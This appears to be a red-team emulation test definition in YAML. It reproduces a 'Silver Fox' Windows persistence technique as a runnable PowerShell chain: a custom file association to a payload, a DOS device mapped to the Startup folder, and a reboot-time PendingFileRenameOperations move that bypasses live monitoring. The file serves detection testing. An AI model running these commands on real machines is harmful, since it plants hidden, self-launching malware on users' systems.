uuid: 7c83a1d0-5e1f-4a7c-b9f2-6d28f3c849b5
name: Silver Fox Persistence via File Association and DOS Device Mapping
id:
  - T068
  - T1112
  - T1547.001
source: CTI Report
supported_platforms:
  - Windows
tactics:
  - Persistence
  - Defense Evasion
technique:
  - Exploitation for Privilege Escalation
  - Boot or Logon Autostart Execution
  - Modify Registry 
description: |
  This technique, employed by the "Silver Fox" group, establishes stealthy persistence by chaining several evasive maneuvers. 
  It begins by creating a new file association for a custom file extension and linking it to a malicious payload. 
  To obscure the final destination, it maps a virtual drive letter (a DOS device) to the system's Startup directory. 
  The core of the technique involves using the `PendingFileRenameOperations` registry key to schedule a file move operation 
  that will only occur during the next system reboot. This action moves a trigger file into the Startup folder, bypassing live 
  monitoring from security software. Upon reboot, Windows places the file in the Startup folder and automatically executes it 
  due to the file association, running the malware and achieving persistence while simultaneously cleaning up the initial trigger file.
execution:
  executor: PowerShell
  command: |
    reg add "HKEY_CLASSES_ROOT\.wofldd" /ve /d "sys_update" /f
    New-Item -Path "Registry::HKEY_CLASSES_ROOT\sys_update\shell\open\command" -Force
    Set-ItemProperty -Path "Registry::HKEY_CLASSES_ROOT\sys_update\shell\open\command" -Name "(Default)" -Value '"#{MALWARE_PATH}" "%1"'
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices" /v "O:" /t REG_SZ /d "\??\C:\ProgramData\Microsoft\Windows\Start Menu\Programs" /f
    if (-not (Test-Path "C:\temp")) { New-Item -Path "C:\temp" -ItemType Directory -Force }
    New-Item -Path "C:\temp\sys_update.wofldd" -ItemType File -Force | Out-Null
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
    $sourceFile = "\??\C:\temp\sys_update.wofldd"
    $destinationFile = "\??\O:\Startup\sys_update.wofldd"
    $value = @($sourceFile, $destinationFile)
    New-ItemProperty -Path $regPath -Name "PendingFileRenameOperations" -PropertyType MultiString -Value $value -Force
arguments:
  MALWARE_PATH:
    CurrentSetting: C:\Users\win\Desktop\2.bat
    Required: true
    Description: The full path to the malicious payload to be executed.
preconditions:
  - (powershell ?eID - executor ?target - host)
  - (administrator_user ?user - user)
effects:
  - (registry_modified ?target - host ?regPath - registry_key)
  - (file_execution_at_startup ?file - file ?target - host)
